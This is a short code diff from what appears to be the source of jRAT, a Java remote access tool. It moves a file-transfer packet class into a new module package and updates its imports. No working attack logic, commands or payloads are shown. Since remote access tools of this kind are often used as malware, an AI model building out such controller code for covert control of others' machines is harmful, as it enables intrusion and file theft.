@@ -1,9 +1,10 @@
-package jrat.controller.packets.incoming;
+package jrat.module.fs.packets;
 
 import jrat.common.io.FileCache;
 import jrat.common.io.TransferData;
 import jrat.controller.Slave;
-import jrat.controller.ui.panels.PanelFileTransfers;
+import jrat.controller.packets.incoming.IncomingPacket;
+import jrat.module.fs.ui.PanelFileTransfers;
 
 import java.io.File;
 
